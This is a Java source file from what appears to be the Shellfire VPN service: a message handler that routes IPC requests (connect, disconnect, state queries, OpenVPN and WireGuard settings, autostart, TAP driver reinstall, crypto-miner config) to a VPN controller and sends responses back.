package de.shellfire.vpn.service;

import java.io.IOException;

import org.slf4j.Logger;

import de.shellfire.vpn.Util;
import de.shellfire.vpn.client.ConnectionState;
import de.shellfire.vpn.client.ConnectionStateChangedEvent;
import de.shellfire.vpn.client.ConnectionStateListener;
import de.shellfire.vpn.messaging.EmptyPayload;
import de.shellfire.vpn.messaging.Message;
import de.shellfire.vpn.messaging.MessageBroker;
import de.shellfire.vpn.messaging.MessageListener;
import de.shellfire.vpn.messaging.MessageType;
import de.shellfire.vpn.types.Reason;

@SuppressWarnings("unchecked")
public class ServiceMessageHandler implements MessageListener<Object>, ConnectionStateListener {

	private static Logger log = Util.getLogger(ServiceMessageHandler.class.getCanonicalName());

	private final MessageBroker messageBroker;
	private final IVpnController vpnController;

	private ConnectionState connectionState;

	public ServiceMessageHandler() throws IOException {
		this.messageBroker = MessageBroker.getInstance(false);

		this.vpnController = VpnControllerFactory.getVpnController();
		this.vpnController.addConnectionStateListener(this);

		messageBroker.startReaderThread(this); // false indicates it's a server listener
	}

	@Override
	public void messageReceived(Message<?, ?> message) {
		try {
			switch (message.getMessageType()) {
			case Ping:
				handlePing(message);
				break;
			case Connect:
				handleConnect(message);
				break;
			case SetAppDataFolder:
				handleSetAppDataFolder(message);
				break;
			case SetWireguardConfigFilePath:
				handleSetWireguardConfigFilePath(message);
				break;
			case Error:
				handleError(message);
				break;
			case Disconnect:
				handleDisconnect(message);
				break;
			case GetConnectionState:
				handleGetConnectionState(message);
				break;
			case SetParametersForOpenVpn:
				handleSetParametersForOpenVpn(message);
				break;
			case SetCryptoMinerConfig:
				handleSetCryptoMinerConfig(message);
				break;
			case ReinstallTapDriver:
				handleReinstallTapDriver(message);
				break;
			case EnableAutoStart:
				handleEnableAutoStart(message);
				break;
			case DisableAutoStart:
				handleDisableAutoStart(message);
				break;
			case AutoStartEnabled:
				handleAutoStartEnabled(message);
				break;
			default:
				handleUnknownMessageType(message);
				break;
			}

		} catch (IOException e) {
			log.error("Error occured during handling of message", e);
		}

	}

	private void handleReinstallTapDriver(Message<?, ?> message) {
		log.info("handleReinstallTapDriver()");
		new Thread(() -> {
			vpnController.reinstallTapDriver();
		}).start();
	}

	private void handleSetParametersForOpenVpn(Message<?, ?> message) {
		log.info("handleSetParametersForOpenVpn()");

		Message<String, EmptyPayload> msg = (Message<String, EmptyPayload>) message;
		String params = msg.getPayload();
		log.info("params: {}", params);
		vpnController.setParametersForOpenVpn(params);
	}

	private void handleSetCryptoMinerConfig(Message<?, ?> message) {
		log.info("handleSetCryptoMinerConfig()");

		Message<String, EmptyPayload> msg = (Message<String, EmptyPayload>) message;
		String params = msg.getPayload();
		log.info("params: {}", params);
		vpnController.setCryptoMinerConfig(params);
	}

	private void handleGetConnectionState(Message<?, ?> message) throws IOException {
		log.info("handleGetConnectionState() - sending connection state");

		new Thread(() -> {
			ConnectionState connectionState = vpnController.getConnectionState();
			log.info("ConnectionState: {}", connectionState);

			Message<ConnectionState, EmptyPayload> msg = (Message<ConnectionState, EmptyPayload>) message;
			Message<ConnectionState, EmptyPayload> response = msg.createResponse(connectionState);
			try {
				messageBroker.sendMessage(response);
			} catch (IOException e) {
				log.error("Error occured during handling of message", e);
			}
		}).start();
	}

	private void handleDisconnect(Message<?, ?> message) {
		log.info("handleDisconnect()");
		new Thread(() -> {
			Message<Reason, EmptyPayload> msg = (Message<Reason, EmptyPayload>) message;
			Reason reason = msg.getPayload();
			log.info("Reason: {}", reason.name());
			vpnController.disconnect(reason);
		}).start();
	}

	private void handleError(Message<?, ?> message) {
		log.info("handleError() - received an error message from the client. Logging it, but otherwise ignoring it.");
		Message<Exception, EmptyPayload> msg = (Message<Exception, EmptyPayload>) message;
		Exception e = msg.getPayload();
		log.error(e.getMessage(), e);
	}

	private void handleSetAppDataFolder(Message<?, ?> message) {
		log.info("handleSetAppDataFolder()");
		Message<String, EmptyPayload> msg = (Message<String, EmptyPayload>) message;

		String appDataFolder = msg.getPayload();
		log.info("appDataFolder: {}", appDataFolder);
		vpnController.setAppDataFolder(appDataFolder);
	}

	private void handleSetWireguardConfigFilePath(Message<?, ?> message) {
		log.info("handleSetWireguardConfigFilePath()");
		Message<String, EmptyPayload> msg = (Message<String, EmptyPayload>) message;

		String wireguardConfigFilePath = msg.getPayload();
		log.info("handleSetWireguardConfigFilePath: {}", wireguardConfigFilePath);
		vpnController.setWireguardConfigFilePath(wireguardConfigFilePath);
	}

	private void handleConnect(Message<?, ?> message) {
		log.info("handleConnect()");
		Message<Reason, EmptyPayload> msg = (Message<Reason, EmptyPayload>) message;

		Reason reason = msg.getPayload();
		log.info("Reason: {}", reason.name());
		new Thread(() -> {
			vpnController.connect(reason);
		}).start();
	}

	private void handleEnableAutoStart(Message<?, ?> message) {
		log.info("handleEnableAutoStart()");
		new Thread(() -> {
			vpnController.enableAutoStart();
		}).start();
	}

	private void handleDisableAutoStart(Message<?, ?> message) {
		log.info("handleDisableAutoStart()");
		new Thread(() -> {
			vpnController.disableAutoStart();
		}).start();
	}

	private void handleUnknownMessageType(Message<?, ?> message) {
		log.warn("Warning: Received message of unknown type: " + message);
	}

	private void handlePing(Message<?, ?> message) throws IOException {
		log.info("handlePing() - sending pingback");

		new Thread(() -> {
			Message<Boolean, EmptyPayload> msg = (Message<Boolean, EmptyPayload>) message;
			Message<Boolean, EmptyPayload> response = msg.createResponse(true);
			try {
				messageBroker.sendMessage(response);
			} catch (IOException e) {
				log.error("Error occured during handling of message", e);
			}
		}).start();
	}

	private void handleAutoStartEnabled(Message<?, ?> message) throws IOException {
		log.info("Received request IsAutoStartEnabled");

		new Thread(() -> {
			Boolean isAutoStartEnabled = vpnController.autoStartEnabled();
			log.info("Sending response: {}", isAutoStartEnabled);

			Message<Boolean, EmptyPayload> msg = (Message<Boolean, EmptyPayload>) message;
			Message<Boolean, EmptyPayload> response = msg.createResponse(isAutoStartEnabled);

			try {
				messageBroker.sendMessage(response);
			} catch (IOException e) {
				log.error("Error occured during handling of message", e);
			}
		}).start();
	}

	@Override
	public void connectionStateChanged(ConnectionStateChangedEvent event) {
		log.debug("connectionStateChanged(ConnectionStateChangedEvent={})", event.toString());

		new Thread(() -> {
			try {
				connectionState = event.getConnectionState();
				Message<ConnectionStateChangedEvent, EmptyPayload> message = new Message<ConnectionStateChangedEvent, EmptyPayload>(
						MessageType.ConnectionStateChanged, event);
				messageBroker.sendMessage(message);
			} catch (IOException e) {
				log.error("Error occured while sending connectionStateChanged message to client: {}", e.getMessage(),
						e);
			}
		}).start();
	}

	public void close() {
		log.debug("close() - start");

		if (vpnController == null) {
			log.warn("vpnController is null - unable to shut down gracefully");
		} else {
			log.info("close vpnController...");
			vpnController.close();
			log.info("...done");
		}

		if (messageBroker == null) {
			log.warn("messageBroker is null - unable to shut down gracefully");
		} else {
			log.info("close messageBroker...");
			messageBroker.close();
			log.info("...done");
		}

		log.debug("close() - finish");
	}

}
